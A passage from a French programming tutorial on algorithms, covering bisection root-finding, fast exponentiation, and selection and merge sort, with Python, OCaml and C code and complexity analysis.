améliorer la qualité de l'approximation. Comme pour la recherche d'un mot dans le dictionnaire, on sélectionne une nouvelle valeur $m$ positionnée au milieu de l'intervalle $[a;b]$. Si $f(m)$ est positif, on peut en déduire que la solution est comprise dans l'intervalle $[a;m]$; sinon, elle se trouve dans l'intervalle $[m; b]$. On a donc réduit l'intervalle initial de moitié, affinant ainsi la qualité de l'approximation. On continue de la sorte jusqu'à ce que la taille de l'intervalle soit considérée comme suffisamment petite. Voici une mise en pratique, en Python : def f ( x ): return x ** 2 - 2 def find_zero ( a , b , erreur ): if ( b - a ) < erreur : return ( a , b ) milieu = ( a + b ) / 2. if f ( a ) * f ( milieu ) < 0 : return find_zero ( a , milieu , erreur ) else : return find_zero ( milieu , b , erreur ) # Un petit exemple print ( find_zero ( 0 , 2 , 0.0001 )) Le principe de la dichotomie est toujours le même : on divise notre problème en deux parties, et on en élimine une. La différence principale avec les codes précédents se trouve dans le test qui permet de décider si on reste dans l'intervalle $[a; m]$ ou $[m; b]$. Dans le cas où $f(a)$ et $f(b)$ sont tous les deux positifs ou tous les deux négatifs, le produit des deux sera positif. Dans le cas où les deux valeurs ont un signe opposé, le produit sera négatif, et cela nous assure que le zéro se trouve dans cet intervalle. Si vous n'êtes toujours pas convaincu, voici un tableau explicitant les différents cas possibles qui permet de justifier la condition que nous avons utilisée : Signe de $f(a)$ Signe de $f(b)$ Signe de $f(a) \\times f(b)$ $ + $ $ + $ $ +$ $-$ $- $ $+$ $ - $ $+$ $-$ $+$ $-$ $-$ Il existe d'autres méthodes pour rechercher les 'zéros de fonctions' (c'est-à-dire les points où les fonctions s'annulent), certaines étant encore plus efficaces dans des cas spécifiques. Cependant, la recherche dichotomique est une très bonne base parce qu'elle marche sur n'importe quelle fonction continue (si on connaît deux points dont les valeurs sont de signes opposés) et que le gain de précision est \"garanti\" : on sait précisément quelle approximation on aura au bout de $N$ étapes (et c'est $\\frac{L}{2&#94;N}$, où $L$ est la longueur de l'intervalle de recherche initial). Exponentiation rapide La dichotomie n'est pas le seul exemple d'algorithme qui découpe les données pour les traiter séparément. La méthode générale est appelée \"diviser pour régner\" (ou parfois en anglais \" divide and conquer \", en référence aux souverains qui pensaient que séparer leurs sujets en groupes bien distincts permettait de les gouverner plus facilement - cela évitait, par exemple, qu'ils se regroupent pour demander des augmentations de salaire, ou ce genre de choses gênantes). Il est important de noter que ces algorithmes ne font pas qu'éliminer, comme la dichotomie, une partie des données, mais qu'ils peuvent profiter de la subdivison pour effectuer moins de calculs. On peut mettre en application cette idée de façon très astucieuse pour calculer les puissances d'un nombre. Pour ceux qui ne seraient pas au courant, x à la puissance n, noté $x&#94;n$, vaut x multiplié par lui-même n fois : $x \\times x \\times ... \\times x$ , avec $n$ termes 'x', et (par convention) $x&#94;0$ vaut 1 (c'est un choix naturel et pratique). Cette opération est très utile, par exemple si on se demande \"quelle est la quantité de nombres différents qui ont au plus 3 chiffres ?\" : la réponse est $10&#94;3$ ; de 0 à 999, il y a $10&#94;3 = 10 \\times 10 \\times 10 = 1000$ nombres. Avec cette définition, comment calculer $x&#94;8$ ? Il est évident qu'une bonne réponse est : $(x \\times x \\times x \\times x \\times x \\times x \\times x \\times x)$. Si l'on demande à l'ordinateur de calculer ça, il va effectuer 7 multiplications (vous pouvez compter). Plus généralement, on peut calculer $x&#94;n$ en effectuant $n-1$ multiplications : c'est un algorithme linéaire, en $O(n)$. Exercice : implémentez cette méthode simple de calcul de la puissance d'un nombre. Cependant, on peut faire mieux, en remarquant que $x&#94;8 = x&#94;4 \\times x&#94;4$ : si l'on calcule $x&#94;4$ (avec la méthode simple, $x&#94;4 = x \\times x \\times x \\times x$, cela fait 3 multiplications), il suffit de le multiplier ensuite par lui-même pour obtenir $x&#94;8$, en faisant seulement une opération supplémentaire, soit 4 au total. On peut faire encore mieux en utilisant le fait que $x&#94;4 = x&#94;2 \\times x&#94;2$ : on peut calculer $x&#94;4$ en deux multiplications, donc $x&#94;8$ en trois multiplications : c'est beaucoup mieux que les 7 multiplications initiales. C'est un algorithme de \"diviser pour régner\", parce qu'en découpant le problème (calcul de $x&#94;8$) en deux sous-problèmes (deux calculs de $x&#94;4$), on s'est rendu compte qu'on avait énormément simplifié la question : il suffit de s'intéresser à un des sous-problèmes et le deuxième tombe avec, puisqu'on peut réutiliser le résultat du premier calcul (en faisant une multiplication supplémentaire). Vous avez peut-être déjà reconnu la configuration qui commence à être familière : pour passer de $x&#94;4$ à $x&#94;8$, donc en doublant la difficulté, il suffit de rajouter une opération (une multiplication) ; il y a du logarithme dans l'air ! Cependant, il reste un problème à résoudre : avec cette bonne idée, on peut calculer facilement $x&#94;2$, $x&#94;4$, $x&#94;8$, $x&#94;{16}$, $x&#94;{32}$, etc., mais comment faire pour les nombres qui sont moins \"gentils\" comme 7, 13 ou 51 ? Plus généralement, on sait comment réduire efficacement le problème du calcul de $x&#94;n$ quand n est pair : on a $x&#94;n = \\frac{x&#94;n}{2} \\times \\frac{x&#94;n}{2}$. Quand $n$ est impair, la division par 2 donne un reste, cette méthode n'est donc pas utilisable directement. Cependant, il suffit de calculer $x&#94;{n-1}$ (ce qui est facile puisque si n est impair, alors $n-1$ est pair), et de multiplier ensuite par $x$ pour obtenir $x&#94;n$ : $x&#94;0 = 1$ ; si $n$ est pair, $x&#94;n = x&#94;\\frac{n}{2} \\times x&#94;\\frac{n}{2}$ ; si $n$ est impair, $x&#94;n = x&#94;{n-1} \\times x$. Cet algorithme nous permet de calculer récursivement $x&#94;n$ en très peu de multiplications. On l'appelle \"exponentiation rapide\", parce qu'exponentiation veut dire \"mise à la puissance\", et qu'il est rapide. :) def exponentiation_rapide ( x , n ): if n == 0 : return 1 elif n % 2 == 0 : a = exponentiation_rapide ( x , n / 2 ) return a * a else : return x * exponentiation_rapide ( x , n - 1 ) print exponentiation_rapide ( 2 , 10 ) Une petite remarque sur le code : le cas du milieu, if n % 2 == 0 , est le cas important puisque c'est lui qui met en place la \"bonne idée\" qui permet d'aller plus vite. Ce qui fait qu'il est efficace, c'est qu'on enregistre le résultat de exponentiation_rapide(x, n / 2) pour le calculer une seule fois. Si l'on avait écrit à la place return exponentiation_rapide(x, n / 2) * exponentiation_rapide(x, n / 2) , notre algorithme aurait fait deux fois le même calcul, tuant complètement l'intérêt de cette méthode : on serait revenu à l'algorithme linéaire expliqué plus tôt, mais codé de façon plus compliquée. Voyons maintenant sa complexité : on a montré que quand on double $n$, il suffit de faire une opération de plus : pour les puissances de 2, il suffit de $log(n)$ opérations pour calculer $x&#94;n$. Mais cela ne fonctionne pas pour les nombres impairs : si on double $n$ et qu'on lui ajoute 1, on obtient un nombre impair et il faut faire deux opérations de plus. Mais ce n'est pas grave, car \"deux opérations\" et \"une opération\", c'est presque la même chose : cela ne diffère qu'à un coefficient multiplicatif près. Au pire, on fait deux fois plus d'opérations $2 \\times log(n)$, mais cela conserve la même complexité : l'algorithme d'exponentiation rapide a une complexité logarithmique (autrement dit, en $O(log N)$). Il faut savoir que c'est un algorithme très important parce qu'il apparaît dans des situations très diverses. En effet, on l'utilise ici pour faire des puissances de nombres réels, mais il est beaucoup plus général que ça : on peut l'utiliser sur tout un tas d'objets mathématiques divers (il suffit de pouvoir définir l'opération de \"mise à la puissance\" sur ces objets), et il permet alors de faire les choses les plus étranges. Par exemple, si vous connaissez la suite de Fibonacci (ou si vous aimez vous renseigner sur Wikipédia), il existe de nombreux algorithmes permettant de calculer le $n$-ième terme de cette suite : un de ces algorithmes utilise l'exponentiation rapide, et il est extrêmement efficace (c'est un des plus rapides qui existe, beaucoup plus rapide que le calcul des termes entre de 1 à $n$). Enfin, n'hésitez pas à jeter un œil au sujet sur l'exponentiation rapide dans le forum. Les algorithmes de la forme \"diviser pour régner\" sont très importants et nous en rencontrerons à plusieurs reprises dans les prochains chapitres. Introduction au problème du tri Comme on l'a vu, il est facile de rechercher un élément particulier dans un ensemble trié, par exemple un dictionnaire. Mais dans la \"vraie vie\", ou plutôt dans la vie d'un programmeur, les informations ne sont pas souvent triées. Il se produit même un phénomène assez agaçant et très général : quand on laisse quelque chose changer, ça devient vite le bazar (exemple : votre chambre). Des scientifiques très intelligents ont passé beaucoup de temps à étudier ce principe. Il y a plusieurs approches pour se protéger de ce danger. La première est de faire très attention, tout le temps, à ce que les choses soient bien rangées. C'est ce que fait par exemple un bibliothécaire : quand on lui rend un livre, il va le poser sur le bon rayon, au bon endroit, et s'il fait bien cela à chaque fois il est facile de trouver le livre qu'on cherche dans une bibliothèque. C'est aussi ce que certains font avec leur chambre, ils passent leur temps à réordonner leurs livres, leurs cahiers, etc. D'autres préfèrent une méthode plus radicale : toutes les semaines, ou tous les mois, ou tous les dix ans, ils font un grand ménage. Pour l'instant, nous allons nous intéresser au grand ménage : quand on a un ensemble de données dans un ordre quelconque, comment récupérer les mêmes données dans l'ordre ? C'est le problème du tri , et il a de multiples solutions. Curieusement, les méthodes utilisées par l'ordinateur sont parfois très différentes de celles qu'utilisent les humains ; il y a plusieurs raisons, par exemple le fait qu'ils trient souvent beaucoup plus de choses (vous imaginez une chambre avec 5 millions de chaussettes sales ?) mais surtout qu'ils ne font presque jamais d'erreurs et ne s'ennuient jamais. Formuler le problème du tri Problème du tri : On possède une collection d'éléments, que l'on sait comparer entre eux. On veut obtenir ces éléments dans l'ordre , c'est-à-dire une collection contenant exactement les mêmes éléments, mais dans laquelle un élément est toujours \"plus petit\" que tous les éléments suivants. Vous noterez qu'on n'a pas besoin de préciser quel est le type des éléments : on peut vouloir trier des entiers, des mots ou des chaussettes. On n'a pas non plus précisé de méthode de comparaison particulière : si on veut trier une liste de personnes, on peut la trier par nom, par adresse ou par numéro de téléphone. Même pour des entiers, on peut vouloir les trier par ordre croissant ou par ordre décroissant, c'est-à-dire en les comparant de différentes manières. Le tout est de convenir ce que veut dire \"plus petit\" pour ce que l'on veut trier (paradoxalement, si l'on veut trier des entiers en ordre décroissant, on dira que 5 est \"plus petit\" que 3, puisqu'on le veut avant dans la liste triée). Dans la plupart des cas, on triera des entiers par ordre croissant. C'est le cas le plus simple, et les tris exposés ici seront tous généralisables aux autres situations. Question de la structure de donnée Comment sont concrètement stockées nos données ? Nous avons déjà vu deux structures très importantes, les listes et les tableaux. En pratique, vous avez soit une liste soit un tableau sous la main, et vous voulez le trier, vous vous demandez donc \"comment trier ma liste\" ou \"comment trier mon tableau ?\". Il se trouve que les algorithmes pour trier des listes et des tableaux sont assez proches (ils reposent fondamentalement sur les mêmes idées). En général, ce sont les petits détails qui changent. Cependant, il y a tout de même des algorithmes qui utilisent une opération privilégiée d'une des deux structures et ne sont pas adaptés pour l'autre. Nous allons procéder ainsi : nous commencerons par décrire l'algorithme de tri de manière assez abstraite, en prenant beaucoup de distance, et ensuite nous nous demanderons si l'algorithme est adapté pour chaque structure, et si oui comment l'implémenter. Cela permet à la fois d'avoir une approche généraliste qui fait ressortir les idées essentielles de chaque tri, et de discuter à nouveau des problématiques du choix de la structure de donnée. Tri par sélection Le tri par sélection est sans doute le tri le plus simple à imaginer. On a une suite d'éléments dans le désordre, que l'on va appeler E (comme \"entrée\"), et on veut construire une suite de résultats, contenant les mêmes éléments dans l'ordre, que l'on va appeler S (comme \"sortie\"). Quel sera le premier élément de S ? C'est le plus petit élément de E. Il suffit donc de parcourir E, d'en choisir le plus petit élément, et de le mettre en première position dans S. On peut, au passage, l'enlever de la suite E, pour ne pas risquer de se tromper et de l'ajouter plusieurs fois dans S. Quel sera le deuxième élément de S ? C'est le deuxième plus petit élément de E. Quand on a une suite quelconque, c'est plus difficile de trouver le deuxième plus petit élément que le premier (mais ce n'est pas très difficile, vous pouvez essayer comme Exercice ) ; mais ici, on peut jouer sur le fait qu'on a enlevé le plus petit élément, c'est-à-dire qu'on a à disposition la suite E privée de son plus petit élément , que l'on peut noter E'. Le deuxième plus petit élément de E, c'est clairement le premier plus petit élément de E'. Il suffit donc de trouver le plus petit élément de E', le mettre en deuxième position dans S. On peut continuer ainsi pour obtenir le troisième élément, etc. , jusqu'au dernier élément de S. Complexité Quelle est la complexité du tri par sélection ? C'est assez simple. À chaque étape, on trouve le plus petit élément et on le retire ; comme on l'a déjà vu, trouver le plus petit élément est linéaire ($O(N)$, où $N$ est le nombre d'éléments au total) ; retirer un élément est linéaire aussi. On répète les étapes jusqu'à avoir retiré tous les éléments. On effectue donc $N$ étapes, si $N$ est le nombre d'éléments à trier. Cela fait donc $N$ fois une opération en $O(N)$, donc du $O(N&#94;2)$. Le tri par sélection est un algorithme en $O(N&#94;2)$, ou quadratique . Implémentation du tri par sélection Pour une liste L'algorithme pour les listes est très clair. On commence par une fonction retire_min , qui à partir d'une liste renvoie son plus petit élément, et la suite privée de cet élément. Si vous avez lu la première partie, vous savez déjà récupérer le plus petit élément d'une liste, en la parcourant en conservant l'information \"quel est le plus petit élément rencontré pour l'instant ?\". On procède de la même manière, mais on conserve en plus la liste des éléments non minimums (qui ne sont pas des plus petits éléments) déjà rencontrés : quand on trouve un élément plus petit que le minimum courant, on rajoute le minimum courant dans la liste des \"non minimums\" avant de passer à l'élément suivant, et à la fin la liste des \"non minimum\" contient bien tous les éléments, sauf le plus petit. Une implémentation en caml : let rec retire_min min_actuel non_minimums = function | [] -> min_actuel , non_minimums | tete :: queue -> (* on met le plus petit (min) comme minimum_actuel, et on rajoute le plus grand (max) dans les non-minimums *) retire_min ( min min_actuel tete ) ( max min_actuel tete :: non_minimums ) queue Une implémentation en C : List * retire_min ( List * liste , List * non_mins , int min_actuel ) { if ( NULL == liste ) return cons ( min_actuel , non_mins ); else { int min = ( liste -> val < min_actuel ? liste -> val : min_actuel ); int non_min = ( liste -> val > min_actuel ? liste -> val : min_actuel ); return retire_min ( liste -> next , cons ( non_min , non_mins ), min ); } } Remarque : avec cette méthode, l'ordre des éléments dans la \"liste des non minimums\" n'est pas le même que celui de la liste de départ : si un élément du début de la liste reste le plus petit pendant longtemps, puis est finalement ajouté à la liste non_minimums , il sera loin de sa position de départ (faites dans votre tête un essai sur [1;3;4;5;0] par exemple ; à la fin la liste non_minimums est [3;4;5;1] : le 1 a été déplacé). Mais ce n'est pas grave, parce qu'on va utiliser cette fonction sur la liste d'entrée , qui est en désordre : on va la trier ensuite, donc ce n'est pas un problème si on bouleverse un peu l'ordre des éléments en attendant. Ensuite, il est très facile de décrire l'algorithme de tri par sélection : si la liste E est vide, on renvoie la liste vide sinon, on récupère P le premier élément de E, et E' la liste privée de P, on trie E' et on ajoute P devant let rec tri_selection = function | [] -> [] | tete :: queue -> let plus_petit , reste = retire_min tete [] queue in plus_petit :: tri_selection reste List * tri_selection ( List * liste ) { if ( NULL == liste ) return NULL ; else { List * selection , * resultat ; selection = retire_min ( liste -> next , NULL , liste -> val ); resultat = cons ( selection -> val , tri_selection ( selection -> next )); free_list ( selection ); /* on libère la liste intermédiaire */ return resultat ; } } Remarque : on pourrait modifier l'implémentation C de retire_min pour modifier la liste qu'on lui donne au lieu d'en allouer une nouvelle qu'il faut libérer ensuite. Comme ça ne changerait rien à la complexité de l'algorithme (on doit parcourir la liste dans tous les cas, pour trouver le minimum), j'ai choisi de privilégier la simplicité. De manière générale, les codes que je mets dans ce tutoriel n'ont pas pour but d'être les plus rapides possibles, mais d'être les plus clairs possible (en ayant la bonne complexité). Il y a de nombreuses autres façons d'écrire le même algorithme, certaines étant plus performantes ou moins lisibles. Si vous avez un code plus efficace mais plus compliqué pour le même algorithme, vous pouvez le poster en commentaire, mais je ne changerai l'implémentation du tutoriel que si vous m'en proposez une plus simple ou aussi simple. Pour un tableau Quand on trie une liste, on renvoie une nouvelle liste, sans modifier la liste de départ. Pour trier un tableau, on procède souvent (quand l'algorithme s'y prête) différemment : au lieu d'écrire les éléments dans l'ordre dans un nouveau tableau, on modifie le tableau d'entrée en réordonnant les éléments à l'intérieur. Cette approche a un avantage et un inconvénient. L'avantage c'est qu'il n'y a pas besoin de créer un deuxième tableau, ce qui utilise donc moins de mémoire. On dit que c'est un tri en place (tout est fait sur place, on n'a rien rajouté). L'inconvénient c'est que le tableau de départ est modifié. Si pour une raison ou une autre vous aviez envie de conserver aussi l'ordre initial des éléments (par exemple, si vous vouliez vous souvenir aussi de l'ordre dans lequel les données sont arrivées), il est perdu et vous ne pourrez pas le retrouver, à moins de l'avoir sauvegardé dans un autre tableau avant le tri. On commence par une fonction qui échange la position de deux éléments dans un tableau. void echange ( int tab [], int i , int j ) { if ( i != j ) { int temp = tab [ i ]; tab [ i ] = tab [ j ]; tab [ j ] = temp ; } } Au lieu de stocker la valeur du minimum, on stocke son indice (sa position dans le tableau) pour pouvoir échanger les cases ensuite. void tri_selection ( int tab [], int taille ) { int i , j ; for ( i = 0 ; i < taille - 1 ; ++ i ) { int i_min = i ; for ( j = i + 1 ; j < taille ; ++ j ) if ( tab [ j ] < tab [ i_min ]) i_min = j ; echange ( tab , i , i_min ); } } On parcourt le tableau avec un indice i qui va de 0 à la fin du tableau. Pendant le parcours, le tableau est divisé en deux parties : à gauche de i (les indices 0 .. i-1 ) se trouvent les petits éléments, triés, et à droite les autres éléments dans le désordre. À chaque tour de boucle, on calcule le plus petit élément de la partie non encore triée, et on l'échange avec l'élément placé en i . Ainsi, la partie 0 .. i du tableau est triée, et on peut continuer à partir de i+1 ; à la fin le tableau sera complètement trié. Pour faire le parallèle avec les listes, au lieu de retirer l'élément du tableau, on le met dans une partie du tableau qu'on ne parcours plus ensuite. Remarque : la boucle sur i s'arrête en fait avant taille-1 , et pas avant taille comme d'habitude : quand il ne reste plus qu'un seul élément à trier, il n'y a rien à faire : il est forcément plus grand que tous les éléments précédents, sinon il aurait été choisi comme minimum et échangé, donc il est à la bonne position. La fonction ne renvoie rien, mais après son exécution le tableau d'entrée est trié. #define N 5 int main () { int i , tab [ N ] = { 1 , 5 , 4 , 3 , 6 }; tri_selection ( tab , N ); /* modifie le tableau `tab` */ for ( i = 0 ; i < N ; ++ i ) printf ( \"%d \" , tab [ i ]); printf ( \" \\n \" ); return 0 ; } Comparaison Les deux implémentations de la même idée illustrent bien les différences majeures entre les listes et les tableaux. On utilise dans un cas la possibilité d'ajouter et d'enlever facilement des éléments à une liste, et dans l'autre l'accès arbitraire qui permet de parcourir, comparer et échanger seulement des cases bien précises du tableau. Tri par insertion Il existe un tri très proche du tri par sélection, appelé tri par insertion, qui a la même complexité ($O(N&#94;2)$) mais est en pratique plus efficace (car il effectue moins de comparaisons). Vous pouvez vous référer à deux tutoriels le décrivant : une version avec des tableaux, à lire en premier, implémentée en C une version avec des listes, implémentée en OCaml Le retour du \"diviser pour régner\" : Tri fusion Vous avez maintenant vu le tri par sélection, dont le fonctionnement est assez naturel. Vous vous dites peut-être que finalement, ce tuto est assez inutile, puisqu'il ne fait que parler longuement de chose assez évidentes. Découvrir que pour trier une liste il faut commencer par chercher le plus petit élément, merci, votre petite soeur de deux ans et demi l'aurait deviné (et en plus, elle est mignonne, et elle mange de la purée de potiron, avantages décisifs qui manquent à ce modeste tutoriel). Nous allons maintenant voir un autre tri, le tri par fusion. Il est surprenant par deux aspects, qui sont très liés : il n'est pas du tout naturel au départ ; il est beaucoup plus efficace que les tri quadratiques vus jusqu'à présent. C'est en effet un tri qui a une complexité bien meilleure que les tris par sélection ou insertion. On ne le voit pas sur un petit nombre d'élément, mais sur de très gros volumes c'est décisif. Nous verrons sa complexité en détail après avoir décrit l'algorithme. Algorithme L'idée du tri par fusion se décrit en une phrase : on coupe la liste en deux parts égales, on trie chaque moitié, et on fusionne les deux demi-listes Vous avez bien entendu reconnu une approche de type \"diviser pour régner\" : on découpe le problème (un tableau => deux demi-tableaux), on traite chaque sous-problème séparément, puis on rassemble les résultats de manière intelligente. Évidemment, tout le sel de la chose se situe dans la phase de fusion : on a deux demi-listes triées, et on veut obtenir une liste triée. On pourrait se dire qu'il suffit de mettre les deux listes bout à bout, par exemple si on a les deux listes triées [1; 2; 3] et [4; 5; 6] , on les colle et pouf [1;2;3;4;5;6] . Malheureusement, ça ne marche pas, prenez par exemple [1; 3; 6] et [2; 4; 5] . Il y a bien quelque chose à faire, et ce quelque chose a intérêt à être efficace : si cette opération cruciale du tri est trop lente, on peut jeter l'ensemble. L'idée qui permet d'avoir une fusion efficace repose sur le fait que les deux listes sont triées. Il suffit en fait de les parcourir dans l'ordre : on sait que les plus petits éléments des deux listes sont au début, et le plus petit élément de la liste globale est forcément soit le plus petit élément de la première liste, soit le plus petit élément de la deuxième (c'est le plus petit des deux). Une fois qu'on l'a déterminé, on le retire de la demi-liste dans laquelle il se trouve, et on recommence à regarder les éléments du début. Une fois qu'on a épuisé les deux demi-listes, on a bien effectué la fusion. Implémentation avec des listes Commençons par coder l'opération de fusion d'un couple de listes : si l'une des listes est vide, on renvoie l'autre liste ; sinon, on compare les têtes de chaque liste, on prend la plus petite et on rappelle la fusion sur la queue de cette liste, et l'autre demi-liste. En Caml : let rec fusion = function | ( [] , li ) | ( li , [] ) -> li | tete_a :: queue_a , tete_b :: queue_b -> let bonne_tete , queue , autre_demi_liste = if tete_a < tete_b then tete_a , queue_a , tete_b :: queue_b else tete_b , queue_b , tete_a :: queue_a in bonne_tete :: fusion ( queue , autre_demi_liste ) En C : La version la plus simple est la suivante : List * fusion ( List * gauche , List * droite ) { if ( NULL == gauche ) return droite ; if ( NULL == droite ) return gauche ; if ( gauche -> val <= droite -> val ) return cons ( gauche -> val , fusion ( gauche -> next , droite )); else return cons ( droite -> val , fusion ( gauche , droite -> next )); } Cette version pose cependant un problème. Comme j'en ai déjà parlé pour l'opération de concaténation , il faut parfois faire attention aux risques d'effets de bord : si on modifie la liste de résultat, est-ce que les listes de départ sont modifiées ? Dans l'implémentation que je viens de donner, la réponse est oui : quand on fusionne deux listes, si on arrive à la fin de la liste de gauche ( NULL == gauche ), alors on renvoie la liste de droite ( return droite; ). Cela veut dire que si on modifie la fin de la liste, la liste de droite qu'on a passé en paramètre sera modifiée aussi : void print_list ( List * liste ) { while ( NULL != liste ) { printf ( \"%d \" , liste -> val ); liste = liste -> next ; } printf ( \" \\n \" ); } int main () { List * a , * b , * c ; printf ( \"Éléments de a : \\n \" ); a = cons ( 1 , NULL ); print_list ( a ); printf ( \"Éléments de b : \\n \" ); b = cons ( 2 , cons ( 3 , NULL )); print_list ( b ); printf ( \"Éléments de c = fusion(a,b) : \\n \" ); c = fusion ( a , b ); print_list ( c ); printf ( \"Modification du troisième élément c : \\n \" ); c -> next -> next -> val = 5 ; print_list ( c ); printf ( \"Est-ce que b a été modifiée ? \\n \" ); print_list ( b ); free_list ( a ); free_list ( c ); return 0 ; } La dernière ligne affiche \"2 5\" : b a été modifiée quand on a changé c ! Ce comportement est dangereux et risque de conduire à des bugs (question bonus : pourquoi seulement free_list(a); free_list(c); ?). On peut peut-être s'en sortir (en faisant attention à ne faire des fusions que de listes temporaires dont on n'aura pas besoin ensuite), mais je préfère m'assurer qu'il n'y a aucun risque et coder une nouvelle version de fusion qui copie les éléments des listes au lieu de les reprendre directement. Ce sera un peu moins rapide, mais la complexité sera la même, et les chances de bugs plus petites. Si vous aimez jouer avec le feu, vous pouvez essayer de coder tri_fusion sans ces copies supplémentaires. List * copy_list ( List * liste ) { if ( NULL == liste ) return NULL ; else return cons ( liste -> val , copy_list ( liste -> next )); } List * fusion ( List * gauche , List * droite ) { if ( NULL == gauche ) return copy_list ( droite ); else if ( NULL == droite ) return copy_list ( gauche ); else if ( gauche -> val <= droite -> val ) return cons ( gauche -> val , fusion ( gauche -> next , droite )); else return cons ( droite -> val , fusion ( gauche , droite -> next )); } Il y a une autre opération à implémenter : la découpe d'une liste en deux demi-listes. On parcourt la liste par bloc de deux éléments, en ajoutant le premier dans la demi-liste de gauche, le deuxième dans la demi-liste de droite. S'il reste moins de deux éléments, on met la liste n'importe où (par exemple à gauche) et on met une liste vide de l'autre côté. En Caml : let rec decoupe = function | ( [] | [_]) as liste -> ( liste , [] ) | gauche :: droite :: reste -> let ( reste_gauche , reste_droite ) = decoupe reste in gauche :: reste_gauche , droite :: reste_droite En C : void decoupe ( List * liste , List ** gauche , List ** droite ) { do { if ( NULL != liste ) { * gauche = cons ( liste -> val , * gauche ); liste = liste -> next ; } if ( NULL != liste ) { * droite = cons ( liste -> val , * droite ); liste = liste -> next ; } } while ( NULL != liste ); } On peut alors écrire facilement le tri (s'il reste moins de deux éléments, la liste est déjà triée donc on la renvoie directement) : En Caml : let rec tri_fusion = function | ( [] | [_]) as liste_triee -> liste_triee | liste -> let demi_gauche , demi_droite = decoupe liste in fusion ( tri_fusion demi_gauche , tri_fusion demi_droite ) En C : Dans l'implémentation en C, il faut faire attention à bien libérer la mémoire allouée par les listes temporaires : les résultats de decoupe , fusion et tri_fusion . List * tri_fusion ( List * liste ) { if ( NULL == liste || NULL == liste -> next ) return copy_list ( liste ); else { List * gauche , * droite , * gauche_triee , * droite_triee , * resultat ; /* au début, gauche et droite sont vides */ gauche = NULL ; droite = NULL ; /* on decoupe la liste en gauche et droite */ decoupe ( liste , & gauche , & droite ); /* on trie gauche et droite, avant de les libérer */ gauche_triee = tri_fusion ( gauche ); droite_triee = tri_fusion ( droite ); free_list ( gauche ); free_list ( droite ); /* on fait la fusion des deux listes triées, avant de les libérer */ resultat = fusion ( gauche_triee , droite_triee ); free_list ( gauche_triee ); free_list ( droite_triee ); /* il ne reste plus qu'à renvoyer le résultat */ return resultat ; } } Code de test : int main () { List * a , * b , * c ; a = cons ( 1 , cons ( 5 , cons ( 4 , cons ( 3 , cons ( 6 , NULL ))))); b = tri_fusion ( a ); print_list ( a ); print_list ( b ); free_list ( a ); free_list ( b ); return 0 ; } Implémentation avec des tableaux L'implémentation avec des tableaux a des avantages et des inconvénients. La phase de découpe est très simple : comme on connaît à l'avance la taille du tableau, il suffit de la diviser par deux et de couper au milieu l'opération de fusion est moins naturelle : il faut manipuler les indices On commence par coder l'opération de fusion. On procède à peu près comme pour les listes, sauf qu'au lieu d'utiliser une procédure récursive, on utilise une boucle pour parcourir les tableaux. On doit conserver trois indices différents : la position de lecture dans le premier demi-tableau la position de lecture le deuxième demi-tableau la position d'écriture dans le tableau résultat Le dernier indice évolue de façon prévisible : à chaque fois qu'on choisit un élément dans l'une des demi-listes, il augmente de 1. On peut donc l'utiliser comme indice d'une boucle for . Quand on compare les éléments en tête des deux demi-listes, il faut faire attention à vérifier qu'aucune demi-liste n'est \"épuisée\" (on a pris tous ses éléments, donc l'indice correspondant est supérieur ou égal à sa taille). def fusion ( tab_g , tab_d ): taille_g = len ( tab_g ) taille_d = len ( tab_d ) # On alloue un tableau resultat assez grand pour contenir la fusion # de nos deux tableaux res = [ 0 ] * ( taille_g + taille_d ) i_g = i_d = i = 0 # trois indices pour parcourir les trois tableaux while i_g < taille_g and i_d < taille_d : if tab_g [ i_g ] <= tab_d [ i_d ]: res [ i ] = tab_g [ i_g ] i_g += 1 else : res [ i ] = tab_d [ i_d ] i_d += 1 i += 1 # Il faut eventuellement copier la fin du tableau de gauche while i_g < taille_g : res [ i ] = tab_g [ i_g ] i += 1 i_g += 1 # Idem pour le tableau de droite while i_d < taille_d : res [ i ] = tab_d [ i_d ] i += 1 i_d += 1 return res On utilise une fonction copie pour récupérer chaque demi-tableau dans un tableau à part, avant de les trier. def copie ( tab , debut , fin ): res = [ 0 ] * ( fin - debut + 1 ) i = debut while i <= fin : res [ i - debut ] = tab [ i ] i += 1 return res On peut alors écrire le tri entier. def tri_fusion ( tab ): taille = len ( tab ) if taille <= 1 : return tab else : milieu = taille // 2 # Attention a bien faire une division entiere ! gauche = copie ( tab , 0 , milieu - 1 ) droite = copie ( tab , milieu , taille - 1 ) return fusion ( tri_fusion ( gauche ), tri_fusion ( droite )) tab = [ 1 , 6 , 3 , 2 , 6 , 87 , 3 , 2 , 3 , 8 ] print ( tri_fusion ( tab )) Remarque : On a utilisé une fonction copie pour copier les deux demi-tableaux en dehors du tableau avant de les trier et de les fusionner. La procédure fusion, elle aussi, crée un nouveau tableau, qu'elle renvoie. On a donc alloué de nouveaux tableaux, ce n'est pas un tri en place. Il est possible de faire mieux : on peut, en manipulant des indices au lieu de tableaux complets, trier les demi-tableau dans le tableau initial, ce qui le modifie mais permet de ne pas allouer de mémoire supplémentaire. Par contre, pour l'étape de fusion il faut tout de même copier des informations, par exemple les deux demi-tableaux triés. Ce n'est toujours pas un tri en place. Il est en fait possible de recopier seulement le demi-tableau de gauche. Exercice : Écrire (dans le langage de votre choix) un tri fusion sur les tableaux ne recopiant que le demi-tableau de gauche. Pourquoi ça marche ? Remarque : Il existe des version complètement en place du tri fusion (sans aucune recopie), mais elles sont nettement plus compliquées et souvent moins rapides. Il faut faire un compromis, et la simplicité est souvent le meilleur objectif. Complexité L'étude de la complexité du tri par fusion est assez simple. On commence avec une liste (ou un tableau) de $N$ éléments. On le découpe, ce qui fait deux tableaux de $\\frac{N}{2}$ éléments. On les découpe, ce qui fait 4 tableaux de $\\frac{N}{4}$ éléments. On les découpe, ce qui fait 8 tableaux... Quand est-ce que la phase de découpage s'arrête ? Quand on est arrivé à des tableaux de taille 1. Et combien de fois faut-il diviser N par 2 pour obtenir 1 ? On l'a déjà vu, c'est la fonction logarithme ! En effet, si on a un tableau de taille 1, on renvoie le tableau en une seule opération ($f(0) = 1$), et si on double la taille du tableau il faut faire une découpe de plus ($f(2 \\times N) = f(N) + 1$). C'est bien notre sympathique fonction du chapitre précédent. On a donc $log(N)$ phases de \"découpe\" successives. Quel est le travail effectué à chaque étape ? C'est le travail de fusion : après le tri, il faut fusionner les demi-listes. Notre algorithme de fusion est linéaire : on parcours les deux demi-listes une seule fois, donc la fusion de deux tableaux de taille $\\frac{N}{2}$ est en $O(N)$. Vous allez sûrement me faire remarquer que plus on découpe, plus on a de fusions à faire : au bout de 4 